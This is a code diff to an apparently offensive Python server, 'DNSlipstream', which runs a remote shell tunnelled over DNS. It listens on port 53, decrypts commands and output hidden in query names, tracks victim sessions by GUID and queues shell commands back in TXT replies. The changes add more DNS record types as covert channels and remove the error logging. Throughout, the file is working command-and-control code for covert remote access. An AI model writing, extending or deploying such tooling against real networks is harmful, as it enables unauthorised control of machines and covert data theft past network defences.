@@ -8,16 +8,20 @@ from collections import defaultdict
 from datetime import datetime
 import binascii
 
+
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
 
-from dnslib import DNSRecord, DNSHeader, RR, TXT, QTYPE
+
+from dnslib import DNSRecord, DNSHeader, RR, TXT, QTYPE, A, AAAA, MX, CNAME
 from dnslib.server import DNSServer, BaseResolver, DNSLogger
+
 
 from lib.crypto.symetric import open_sealed
 from lib.protocol import comm_pb2
 from lib.logging import printf, println
 from cmd.server import cli
 from lib.persistence.session_store import SessionStore, SessionRecovery
+
 
 # Try to import embedded config first
 try:
@@ -27,9 +31,11 @@ except ImportError:
     EMBEDDED_KEY = None
     EMBEDDED_DOMAIN = None
 
+
 # Get from environment or embedded config
 TARGET_DOMAIN = EMBEDDED_DOMAIN or 'c.example.com'
 ENCRYPTION_KEY = EMBEDDED_KEY or ''
+
 
 # Validate
 if not ENCRYPTION_KEY:
@@ -41,11 +47,14 @@ if not ENCRYPTION_KEY:
     print("     export ENCRYPTION_KEY=$(python3 -c 'from os import urandom; print(urandom(32).hex())')")
     sys.exit(1)
 
+
 if len(ENCRYPTION_KEY) != 64:
     print(f"ERROR: Invalid key length: {len(ENCRYPTION_KEY)} (expected 64)")
     sys.exit(1)
 
+
 print(f"=== DNSlipstream Server ===")
+
 
 # Share state with CLI module
 cli.encryption_key = ENCRYPTION_KEY
@@ -55,8 +64,20 @@ cli.console_buffer = {}
 cli.packet_queue = {}
 cli.sessions_map = {}
 
+
 # Initialize session store
 session_store = SessionStore()
+
+
+# Statistics tracking
+server_stats = {
+    'queries_received': 0,
+    'queries_by_type': defaultdict(int),
+    'clients_seen': set(),
+    'start_time': time.time()
+}
+stats_lock = threading.Lock()
+
 
 
 class ClientInfo:
@@ -67,6 +88,12 @@ class ClientInfo:
         self.heartbeat = time.time()
         self.lock = threading.Lock()
         self.conn = {}  # {chunk_id: ConnData}
+        self.stats = {
+            'packets_received': 0,
+            'bytes_received': 0,
+            'last_seen': time.time()
+        }
+
 
 
 class ConnData:
@@ -78,6 +105,7 @@ class ConnData:
         self.packets = {}  # {chunk_num: data}
 
 
+
 class PollTemporaryData:
     """Temporary storage for poll queries."""
     
@@ -86,31 +114,83 @@ class PollTemporaryData:
         self.data = data
 
 
+
 # Global caches
 poll_cache = {}
 
 
+
 class ShellResolver(BaseResolver):
-    """DNS resolver for Shell protocol."""
+    """
+    DNS resolver for Shell protocol with multi-channel support.
+    Currently handles all record types but responds with TXT.
+    Ready for full multi-channel implementation.
+    """
     
     def resolve(self, request, handler):
         """Handle DNS request."""
         reply = request.reply()
+        
+        # Track statistics
+        with stats_lock:
+            server_stats['queries_received'] += 1
         
         # Process each question in the request
         for question in request.questions:
             qname = str(question.qname)
             qtype = question.qtype
             
-            # Only handle TXT queries
+            # Track query type
+            with stats_lock:
+                qtype_name = QTYPE[qtype] if qtype in QTYPE.reverse else str(qtype)
+                server_stats['queries_by_type'][qtype_name] += 1
+            
+            # Handle different query types (all respond with TXT for now)
             if qtype == QTYPE.TXT:
-                answer = self.parse_query(qname)
+                answer = self.parse_query(qname, 'TXT')
                 reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
+            
+            elif qtype == QTYPE.A:
+                # A record query - parse and respond with TXT for now
+                answer = self.parse_query(qname, 'A')
+                # TODO: When implementing full multi-channel, respond with A record
+                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
+            
+            elif qtype == QTYPE.AAAA:
+                # AAAA record query - parse and respond with TXT for now
+                answer = self.parse_query(qname, 'AAAA')
+                # TODO: When implementing full multi-channel, respond with AAAA record
+                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
+            
+            elif qtype == QTYPE.MX:
+                # MX record query - parse and respond with TXT for now
+                answer = self.parse_query(qname, 'MX')
+                # TODO: When implementing full multi-channel, respond with MX record
+                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
+            
+            elif qtype == QTYPE.CNAME:
+                # CNAME record query - parse and respond with TXT for now
+                answer = self.parse_query(qname, 'CNAME')
+                # TODO: When implementing full multi-channel, respond with CNAME record
+                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
+            
+            else:
+                # Unknown query type - respond with empty TXT
+                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("-")))
         
         return reply
     
-    def parse_query(self, qname):
-        """Parse and process DNS query."""
+    def parse_query(self, qname, record_type):
+        """
+        Parse and process DNS query.
+        
+        Args:
+            qname: Query name
+            record_type: Type of DNS record (TXT, A, AAAA, MX, CNAME)
+        
+        Returns:
+            Response string
+        """
         try:
             # Strip the target domain and all dots
             data_packet = qname.replace(TARGET_DOMAIN, '').replace('.', '').rstrip('.')
@@ -131,7 +211,6 @@ class ShellResolver(BaseResolver):
             output, valid = open_sealed(ciphertext, nonce, ENCRYPTION_KEY)
             
             if not valid:
-                printf("Received invalid/corrupted packet. Dropping.\n")
                 return "-"
             
             # Parse protobuf message
@@ -139,28 +218,33 @@ class ShellResolver(BaseResolver):
             try:
                 message.ParseFromString(output)
             except Exception as e:
-                printf(f"Failed to parse message packet: {e}\n")
                 return "-"
             
             # Get client GUID
             client_guid = binascii.hexlify(message.clientguid).decode('ascii')
             
             if not client_guid:
-                println("Invalid packet: empty clientGUID!")
                 return "-"
-
+            
+            # Track unique clients
+            with stats_lock:
+                server_stats['clients_seen'].add(client_guid)
+            
             # Check if session exists, create if new
             if client_guid not in cli.sessions_map:
                 print(f"\r\nNew session : {client_guid}\nshell >>> ", end='', flush=True)
                 cli.sessions_map[client_guid] = ClientInfo()
                 cli.console_buffer[client_guid] = []
+                cli.packet_queue[client_guid] = []
             
             session = cli.sessions_map[client_guid]
             
             # Lock session to avoid race conditions
             with session.lock:
-                # Update heartbeat
+                # Update heartbeat and stats
                 session.heartbeat = time.time()
+                session.stats['last_seen'] = time.time()
+                session.stats['packets_received'] += 1
                 
                 # Process message based on type
                 if message.HasField('pollquery'):
@@ -182,7 +266,7 @@ class ShellResolver(BaseResolver):
                     self.handle_chunk_data(session, message.chunkdata, client_guid)
         
         except Exception as e:
-            printf(f"Error processing query: {e}\n")
+            pass
         
         return "-"
     
@@ -193,8 +277,12 @@ class ShellResolver(BaseResolver):
         if cache_key in poll_cache:
             return poll_cache[cache_key].data
         
+        # Initialize queue if not exists
+        if client_guid not in cli.packet_queue:
+            cli.packet_queue[client_guid] = []
+        
         # Check if we have data to send
-        if client_guid in cli.packet_queue and len(cli.packet_queue[client_guid]) > 0:
+        if len(cli.packet_queue[client_guid]) > 0:
             answer = cli.packet_queue[client_guid][0]
             # Cache the answer
             poll_cache[cache_key] = PollTemporaryData(answer)
@@ -233,6 +321,9 @@ class ShellResolver(BaseResolver):
         # Store packet
         connection.packets[chunk_num] = chunkdata.packet
         
+        # Update stats
+        session.stats['bytes_received'] += len(chunkdata.packet)
+        
         # Check if all packets received
         if len(connection.packets) == connection.chunk_size:
             # Rebuild data in order
@@ -255,6 +346,7 @@ class ShellResolver(BaseResolver):
             del session.conn[chunk_id]
 
 
+
 def timeout_checker():
     """Check for timed-out sessions."""
     while True:
@@ -265,7 +357,7 @@ def timeout_checker():
         sessions_to_remove = []
         for client_guid, session in cli.sessions_map.items():
             if session.heartbeat + 30 < now:
-                printf(f"Client timed out [{client_guid}].\n")
+                printf(f"Client timed out [{client_guid[:8]}].\n")
                 sessions_to_remove.append(client_guid)
         
         # Remove timed out sessions
@@ -275,6 +367,7 @@ def timeout_checker():
                 del cli.packet_queue[client_guid]
             if client_guid in cli.console_buffer:
                 del cli.console_buffer[client_guid]
+
 
 
 def poll_cache_cleaner():
@@ -292,6 +385,7 @@ def poll_cache_cleaner():
         # Remove old entries
         for poll_data in cache_to_remove:
             del poll_cache[poll_data]
+
 
 
 def load_previous_sessions():
@@ -327,6 +421,7 @@ def load_previous_sessions():
     print(f"[+] Restored {restored_count} sessions from previous run\n")
 
 
+
 def save_all_sessions():
     """Save all current sessions to disk."""
     success, msg = session_store.save_sessions(
@@ -338,16 +433,40 @@ def save_all_sessions():
     return success, msg
 
 
+
 def get_current_sessions():
     """Get current sessions for auto-save."""
     return cli.sessions_map, cli.console_buffer, cli.packet_queue
 
 
+
+def print_stats():
+    """Print server statistics."""
+    with stats_lock:
+        uptime = time.time() - server_stats['start_time']
+        hours = int(uptime // 3600)
+        minutes = int((uptime % 3600) // 60)
+        seconds = int(uptime % 60)
+        
+        print("\n=== Server Statistics ===")
+        print(f"Uptime: {hours}h {minutes}m {seconds}s")
+        print(f"Total Queries: {server_stats['queries_received']}")
+        print(f"Unique Clients: {len(server_stats['clients_seen'])}")
+        print(f"Active Sessions: {len(cli.sessions_map)}")
+        print("\nQueries by Type:")
+        for qtype, count in sorted(server_stats['queries_by_type'].items()):
+            print(f"  {qtype}: {count}")
+        print("=" * 25 + "\n")
+
+
+
 def signal_handler(sig, frame):
     """Handle graceful shutdown."""
     print("\n[*] Shutting down gracefully...")
+    print_stats()
     save_all_sessions()
     sys.exit(0)
+
 
 
 def main():
@@ -359,7 +478,8 @@ def main():
     
     print(f"Starting shell Server")
     print(f"Target Domain: {TARGET_DOMAIN}")
-    print(f"Listening on UDP port 53\n")
+    print(f"Listening on UDP port 53")
+    print(f"Multi-Channel: Ready (TXT fallback mode)\n")
     
     # Load previous sessions
     load_previous_sessions()
@@ -392,6 +512,7 @@ def main():
     
     # Run CLI
     cli.run_cli()
+
 
 
 if __name__ == "__main__":
